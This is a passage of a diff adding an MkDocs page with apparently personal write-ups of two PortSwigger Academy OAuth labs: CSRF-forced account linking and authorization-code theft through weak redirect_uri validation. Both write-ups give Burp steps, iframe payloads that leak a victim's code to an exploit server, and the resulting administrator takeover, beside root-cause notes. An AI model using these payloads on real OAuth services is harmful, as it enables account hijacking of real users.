+<h2 id="step-5-drop-request">Step 5 — Drop Request</h2>
+<pre><code>Do NOT forward the request
+</code></pre>
+<p>Reason:</p>
+<ul>
+<li>authorization code must stay unused</li>
+<li>otherwise it becomes invalid</li>
+</ul>
+<hr />
+<h2 id="step-6-logout">Step 6 — Logout</h2>
+<p>Logout from the lab account.</p>
+<hr />
+<h1 id="create-csrf-exploit">🧪 Create CSRF Exploit</h1>
+<p>On exploit server:</p>
+<pre><code>&lt;iframe src=&quot;https://LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN_CODE&quot;&gt;&lt;/iframe&gt;
+</code></pre>
+<hr />
+<h1 id="exploitation-result">🚨 Exploitation Result</h1>
+<p>When victim loads the iframe:</p>
+<ol>
+<li>Browser automatically sends request</li>
+<li>OAuth flow completes</li>
+<li>Victim account links to attacker social account</li>
+</ol>
+<p>Because:</p>
+<ul>
+<li>no state parameter</li>
+<li>no CSRF validation</li>
+</ul>
+<hr />
+<h1 id="account-takeover">👑 Account Takeover</h1>
+<p>Now click:</p>
+<pre><code>Log in with social media
+</code></pre>
+<p>You will be logged in as:</p>
+<pre><code>administrator
+</code></pre>
+<hr />
+<h1 id="final-step">🏁 Final Step</h1>
+<p>Go to:</p>
+<pre><code>Admin Panel
+</code></pre>
+<p>Delete user:</p>
+<pre><code>carlos
+</code></pre>
+<p>Lab solved ✅</p>
+<hr />
+<h1 id="root-cause">🔐 Root Cause</h1>
+<table>
+<thead>
+<tr>
+<th>Issue</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Missing state parameter</td>
+<td>CSRF</td>
+</tr>
+<tr>
+<td>OAuth linking CSRF</td>
+<td>Account takeover</td>
+</tr>
+<tr>
+<td>Forced social linking</td>
+<td>Authentication bypass</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="important-notes">📌 Important Notes</h1>
+<ul>
+<li>The <code>state</code> parameter is critical in OAuth flows.</li>
+<li>Account linking endpoints are commonly vulnerable.</li>
+<li>Always inspect:<ul>
+<li><code>/oauth-linking</code></li>
+<li><code>/callback</code></li>
+<li><code>/auth</code></li>
+</ul>
+</li>
+<li>OAuth misconfigurations often lead to full account compromise.</li>
+</ul>
+<hr />
+<h1 id="payload-used">🧷 Payload Used</h1>
+<pre><code>&lt;iframe src=&quot;https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN_CODE&quot;&gt;&lt;/iframe&gt;
+</code></pre>
+<hr />
+<h3 id="lab-oauth-account-hijacking-via-redirect_uri">Lab: OAuth account hijacking via redirect_uri</h3>
+<h2 id="objective_1">🎯 Objective</h2>
+<p>Exploit weak <code>redirect_uri</code> validation in the OAuth server to steal the victim's authorization code and log in as administrator.</p>
+<hr />
+<h1 id="vulnerability_1">🧠 Vulnerability</h1>
+<pre><code>OAuth authorization code leakage via open redirect_uri
+</code></pre>
+<p>The OAuth server accepts arbitrary <code>redirect_uri</code> values without proper validation.</p>
+<p>This allows attackers to redirect authorization codes to an external domain.</p>
+<hr />
+<h1 id="key-observation_1">🔍 Key Observation</h1>
+<p>During OAuth login:</p>
+<pre><code>GET /auth?client_id=...
+</code></pre>
+<p>The OAuth server redirects user to:</p>
+<pre><code>redirect_uri?code=AUTH_CODE
+</code></pre>
+<p>The vulnerability:</p>
+<ul>
+<li><code>redirect_uri</code> is not properly restricted</li>
+<li>attacker can replace it with their own domain</li>
+</ul>
+<hr />
+<h1 id="normal-oauth-flow">🔄 Normal OAuth Flow</h1>
+<h2 id="step-1-user-logs-in">Step 1 — User Logs In</h2>
+<p>User clicks:</p>
+<pre><code>Log in with social media
+</code></pre>
+<hr />
+<h2 id="step-2-oauth-authorization-request">Step 2 — OAuth Authorization Request</h2>
+<pre><code>GET /auth?client_id=...&amp;redirect_uri=https://victim-site/oauth-callback
+</code></pre>
+<hr />
+<h2 id="step-3-oauth-server-redirects-back">Step 3 — OAuth Server Redirects Back</h2>
+<pre><code>/oauth-callback?code=AUTH_CODE
+</code></pre>
+<p>Application exchanges code for token and logs user in.</p>
+<hr />
+<h1 id="attack-idea_1">💣 Attack Idea</h1>
+<p>If attacker changes:</p>
+<pre><code>redirect_uri=https://exploit-server.net
+</code></pre>
+<p>then OAuth server sends:</p>
+<pre><code>https://exploit-server.net/?code=VICTIM_CODE
+</code></pre>
+<p>Result:</p>
+<pre><code>Authorization code leaked to attacker
+</code></pre>
+<hr />
+<h1 id="exploitation-steps_2">🛠️ Exploitation Steps</h1>
+<h2 id="1-complete-oauth-login">1. Complete OAuth Login</h2>
+<p>Login normally using social login.</p>
+<hr />
+<h2 id="2-observe-silent-authentication">2. Observe Silent Authentication</h2>
+<p>Logout then login again.</p>
+<p>Because OAuth session still exists:</p>
+<pre><code>OAuth server authenticates automatically
+</code></pre>
+<p>No credentials required again.</p>
+<hr />
+<h2 id="3-find-authorization-request">3. Find Authorization Request</h2>
+<p>In Burp Suite Proxy History:</p>
+<p>Locate:</p>
+<pre><code>GET /auth?client_id=...
+</code></pre>
+<p>Send request to Repeater.</p>
+<hr />
+<h2 id="4-test-redirect_uri">4. Test redirect_uri</h2>
+<p>Modify:</p>
+<pre><code>redirect_uri=https://exploit-server.net
+</code></pre>
+<p>Send request.</p>
+<hr />
+<h2 id="5-follow-redirect">5. Follow Redirect</h2>
+<p>Observe response redirects to:</p>
+<pre><code>https://exploit-server.net/?code=XXXX
+</code></pre>
+<p>Check exploit server logs.</p>
+<p>You should see leaked authorization code.</p>
+<hr />
+<h1 id="build-exploit">🧪 Build Exploit</h1>
+<p>Create exploit page:</p>
+<pre><code>&lt;iframe src=&quot;https://oauth-YOUR-LAB-ID.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&amp;redirect_uri=https://YOUR-EXPLOIT-SERVER.exploit-server.net&amp;response_type=code&amp;scope=openid%20profile%20email&quot;&gt;&lt;/iframe&gt;
+</code></pre>
+<hr />
+<h1 id="exploitation-flow">🚨 Exploitation Flow</h1>
+<h2 id="victim-visits-exploit">Victim Visits Exploit</h2>
+<p>Victim browser loads iframe.</p>
+<p>Because victim already has active OAuth session:</p>
+<pre><code>OAuth server automatically authorizes request
+</code></pre>
+<p>OAuth server redirects:</p>
+<pre><code>https://exploit-server.net/?code=VICTIM_CODE
+</code></pre>
+<p>Authorization code leaks into access log.</p>
+<hr />
+<h1 id="account-takeover_1">🔓 Account Takeover</h1>
+<p>Copy victim authorization code from exploit server logs.</p>
+<p>Visit:</p>
+<pre><code>https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN_CODE
+</code></pre>
+<p>Application completes OAuth flow automatically.</p>
+<p>Now attacker becomes:</p>
+<pre><code>administrator
+</code></pre>
+<hr />
+<h1 id="final-step_1">🏁 Final Step</h1>
+<p>Go to:</p>
+<pre><code>Admin Panel
+</code></pre>
+<p>Delete:</p>
+<pre><code>carlos
+</code></pre>
+<p>Lab solved ✅</p>
+<hr />
+<h1 id="root-cause_1">🔐 Root Cause</h1>
+<table>
+<thead>
+<tr>
+<th>Issue</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Weak redirect_uri validation</td>
+<td>Authorization code leakage</td>
+</tr>
+<tr>
+<td>Arbitrary external redirects</td>
+<td>OAuth account takeover</td>
+</tr>
+<tr>
+<td>Missing allowlist validation</td>
+<td>Authentication compromise</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="important-notes_1">📌 Important Notes</h1>
+<ul>
+<li>OAuth servers must strictly validate <code>redirect_uri</code>.</li>
+<li>Authorization codes should only be sent to trusted domains.</li>
+<li>Silent authentication increases impact dramatically.</li>
+<li>Always test:<ul>
+<li>open redirect behavior</li>
+<li>wildcard redirect_uri</li>
+<li>partial matching</li>
+<li>subdomain tricks</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h1 id="payload-used_1">🧷 Payload Used</h1>
+<pre><code>&lt;iframe src=&quot;https://oauth-YOUR-LAB-ID.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&amp;redirect_uri
+</code></pre>
+<hr />
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": [], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u062a\u0645 \u0627\u0644\u0646\u0633\u062e \u0627\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629", "clipboard.copy": "\u0646\u0633\u062e \u0625\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629", "search.result.more.one": "\u0623\u0643\u062b\u0631 \u0645\u0646 1 \u0641\u064a \u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629", "search.result.more.other": "\u0623\u0643\u062b\u0631 \u0645\u0646 # \u0641\u064a \u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629", "search.result.none": "\u0644\u0627 \u062a\u0648\u062c\u062f \u0646\u062a\u0627\u0626\u062c", "search.result.one": "\u0646\u062a\u0627\u0626\u062c \u0627\u0644\u0628\u062d\u062b \u0645\u0633\u062a\u0646\u062f \u0648\u0627\u062d\u062f", "search.result.other": "\u0646\u062a\u0627\u0626\u062c \u0627\u0644\u0628\u062d\u062b # \u0645\u0633\u062a\u0646\u062f\u0627\u062a", "search.result.placeholder": "\u0627\u0643\u062a\u0628 \u0644\u0628\u062f\u0621 \u0627\u0644\u0628\u062d\u062b", "search.result.term.missing": "\u0645\u0641\u0642\u0648\u062f", "select.version": "\u0625\u062e\u062a\u0631 \u0627\u0644\u0625\u0635\u062f\u0627\u0631"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
